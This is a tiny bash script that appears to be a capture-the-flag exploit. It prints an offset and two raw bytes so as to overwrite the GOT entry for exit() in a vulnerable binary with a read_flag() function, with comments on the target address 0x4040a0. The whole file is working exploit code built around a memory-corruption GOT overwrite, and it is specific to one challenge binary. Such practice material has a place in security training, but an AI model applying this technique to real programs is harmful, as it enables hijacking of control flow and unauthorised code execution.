#!/bin/bash

# offsets are relative to 0x4040a0
# the two bytes are written at 0x4040a0 + 8 * offset

compile(){
	printf "%d\n\x$3\x$2\n" $1
}

compile -4 13 5a  # overwrite exit()'s GOT entry with read_flag()
